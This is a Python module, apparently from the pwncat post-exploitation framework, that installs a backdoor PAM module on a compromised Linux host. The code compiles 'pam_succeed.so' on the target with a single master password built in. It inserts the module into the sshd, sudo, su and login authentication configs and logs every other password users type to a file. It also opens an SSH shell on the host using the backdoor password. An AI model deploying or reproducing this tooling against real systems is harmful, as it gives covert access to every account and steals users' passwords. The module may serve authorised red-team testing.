#!/usr/bin/env python3
import pkg_resources
import base64
import hashlib
import socket
import io
import os
from typing import Optional

import paramiko

import pwncat
from pwncat.util import CompilationError, Access
from pwncat.platform.linux import Linux
from pwncat.modules import Argument, Status, PersistError, PersistType
from pwncat.modules.agnostic.persist import PersistModule


class Module(PersistModule):
    """
    Install a backdoor PAM module which allows authentication
    with a single password for all users. This PAM module does
    not interrupt authentication with correct user passwords.
    Further, it will log all entered passwords (except the
    backdoor password) to a log file which can be collected
    with the creds.pam enumeration module. The installed module
    will be named `pam_succeed.so`.
    """

    TYPE = PersistType.LOCAL | PersistType.REMOTE | PersistType.ALL_USERS
    PLATFORM = [Linux]
    ARGUMENTS = {
        **PersistModule.ARGUMENTS,
        "password": Argument(str, help="The password to use for the backdoor"),
        "log": Argument(
            str,
            default="/var/log/firstlog",
            help="Location where username/passwords will be logged",
        ),
    }

    def install(self, user: str, password: str, log: str):
        """ Install this module """

        if user is not None:
            self.progress.log(
                f"[yellow]warning[/yellow]: {self.name}: this module applies to all users"
            )

        if pwncat.victim.current_user.id != 0:
            raise PersistError("must be root")

        # Read the source code
        with open(pkg_resources.resource_filename("pwncat", "data/pam.c"), "r") as filp:
            sneaky_source = filp.read()

        yield Status("checking selinux state")

        # SELinux causes issues depending on it's configuration
        for selinux in pwncat.modules.run(
            "enumerate.gather", progress=self.progress, types=["system.selinux"]
        ):
            if selinux.data.enabled and "enforc" in selinux.data.mode:
                raise PersistError("selinux is currently in enforce mode")
            elif selinux.data.enabled:
                self.progress.log(
                    "[yellow]warning[/yellow]: selinux is enabled; persistence may be logged"
                )

        # We use the backdoor password. Build the string of encoded bytes
        # These are placed in the source like: char password_hash[] = {0x01, 0x02, 0x03, ...};
        password_hash = hashlib.sha1(password.encode("utf-8")).digest()
        password_hash = ",".join(hex(c) for c in password_hash)

        # Insert our key
        sneaky_source = sneaky_source.replace("__PWNCAT_HASH__", password_hash)

        # Insert the log location for successful passwords
        sneaky_source = sneaky_source.replace("__PWNCAT_LOG__", log)

        yield Status("compiling pam module for target")

        try:
            # Compile our source for the remote host
            lib_path = pwncat.victim.compile(
                [io.StringIO(sneaky_source)],
                suffix=".so",
                cflags=["-shared", "-fPIE"],
                ldflags=["-lcrypto"],
            )
        except (FileNotFoundError, CompilationError) as exc:
            raise PersistError(f"pam: compilation failed: {exc}")

        yield Status("locating pam module installation")

        # Locate the pam_deny.so to know where to place the new module
        pam_modules = "/usr/lib/security"
        try:
            results = (
                pwncat.victim.run(
                    "find / -name pam_deny.so 2>/dev/null | grep -v 'snap/'"
                )
                .strip()
                .decode("utf-8")
            )
            if results != "":
                results = results.split("\n")
                pam_modules = os.path.dirname(results[0])
        except FileNotFoundError:
            pass

        yield Status(f"pam modules located at {pam_modules}")

        # Ensure the directory exists and is writable
        access = pwncat.victim.access(pam_modules)
        if (Access.DIRECTORY | Access.WRITE) in access:
            # Copy the module to a non-suspicious path
            yield Status("copying shared library")
            pwncat.victim.env(
                ["mv", lib_path, os.path.join(pam_modules, "pam_succeed.so")]
            )
            new_line = "auth\tsufficient\tpam_succeed.so\n"

            yield Status("adding pam auth configuration")

            # Add this auth method to the following pam configurations
            for config in ["sshd", "sudo", "su", "login"]:
                yield Status(f"adding pam auth configuration: {config}")
                config = os.path.join("/etc/pam.d", config)
                try:
                    # Read the original content
                    with pwncat.victim.open(config, "r") as filp:
                        content = filp.readlines()
                except (PermissionError, FileNotFoundError):
                    continue

                # We need to know if there is a rootok line. If there is,
                # we should add our line after it to ensure that rootok still
                # works.
                contains_rootok = any("pam_rootok" in line for line in content)

                # Add this auth statement before the first auth statement
                for i, line in enumerate(content):
                    # We either insert after the rootok line or before the first
                    # auth line, depending on if rootok is present
                    if contains_rootok and "pam_rootok" in line:
                        content.insert(i + 1, new_line)
                    elif not contains_rootok and line.startswith("auth"):
                        content.insert(i, new_line)
                        break
                else:
                    content.append(new_line)

                content = "".join(content)

                try:
                    with pwncat.victim.open(config, "w", length=len(content)) as filp:
                        filp.write(content)
                except (PermissionError, FileNotFoundError):
                    continue

            pwncat.tamper.created_file(log)

    def remove(self, **unused):
        """ Remove this module """

        try:

            # Locate the pam_deny.so to know where to place the new module
            pam_modules = "/usr/lib/security"

            yield Status("locating pam modules")

            results = (
                pwncat.victim.run(
                    "find / -name pam_deny.so 2>/dev/null | grep -v 'snap/'"
                )
                .strip()
                .decode("utf-8")
            )
            if results != "":
                results = results.split("\n")
                pam_modules = os.path.dirname(results[0])

            yield Status(f"pam modules located at {pam_modules}")

            # Ensure the directory exists and is writable
            access = pwncat.victim.access(pam_modules)
            if (Access.DIRECTORY | Access.WRITE) in access:
                # Remove the the module
                pwncat.victim.env(
                    ["rm", "-f", os.path.join(pam_modules, "pam_succeed.so")]
                )
                new_line = "auth\tsufficient\tpam_succeed.so\n"

                # Remove this auth method from the following pam configurations
                for config in ["sshd", "sudo", "su", "login"]:
                    config = os.path.join("/etc/pam.d", config)
                    try:
                        with pwncat.victim.open(config, "r") as filp:
                            content = filp.readlines()
                    except (PermissionError, FileNotFoundError):
                        continue

                    # Add this auth statement before the first auth statement
                    content = [line for line in content if line != new_line]
                    content = "".join(content)

                    try:
                        with pwncat.victim.open(
                            config, "w", length=len(content)
                        ) as filp:
                            filp.write(content)
                    except (PermissionError, FileNotFoundError):
                        continue
            else:
                raise PersistError("insufficient permissions")
        except FileNotFoundError as exc:
            # Uh-oh, some binary was missing... I'm not sure what to do here...
            raise PersistError(f"[red]error[/red]: {exc}")

    def escalate(self, user: str, password: str, log: str) -> bool:
        """ Escalate to the given user with this module """

        try:
            pwncat.victim.su(user, password)
        except PermissionError:
            raise PersistError("Escalation failed. Is selinux enabled?")

    def connect(
        self, host: pwncat.db.Host, user: str, password: str, log: str
    ) -> socket.SocketType:
        """ Connect to the victim with this module """

        try:
            yield Status("connecting to host")
            # Connect to the remote host's ssh server
            sock = socket.create_connection((host.ip, 22))
        except Exception as exc:
            raise PersistError(str(exc))

        # Create a paramiko SSH transport layer around the socket
        yield Status("wrapping socket in ssh transport")
        t = paramiko.Transport(sock)
        try:
            t.start_client()
        except paramiko.SSHException:
            raise PersistError("ssh negotiation failed")

        # Attempt authentication
        try:
            yield Status("authenticating with victim")
            t.auth_password(user, password)
        except paramiko.ssh_exception.AuthenticationException:
            raise PersistError("incorrect password")

        if not t.is_authenticated():
            t.close()
            sock.close()
            raise PersistError("incorrect password")

        # Open an interactive session
        chan = t.open_session()
        chan.get_pty()
        chan.invoke_shell()

        yield chan
